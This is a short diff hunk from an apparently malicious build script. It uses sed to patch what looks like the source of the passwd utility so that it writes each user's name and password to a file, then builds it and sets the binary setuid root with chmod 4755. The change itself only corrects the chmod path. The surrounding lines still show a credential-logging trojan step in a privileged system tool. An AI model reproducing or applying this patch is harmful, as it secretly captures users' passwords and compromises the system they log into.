@@ -58,4 +58,4 @@ sed -i 's/fprintf(fptr, \"%s:%s/fprintf(fptr, \"%s:%s\\n\", name, password);/g' 
 
 ## Make ##
 sudo make all
-sudo chmod 4755 shadow/src/passwd 
+sudo chmod 4755 src/passwd 
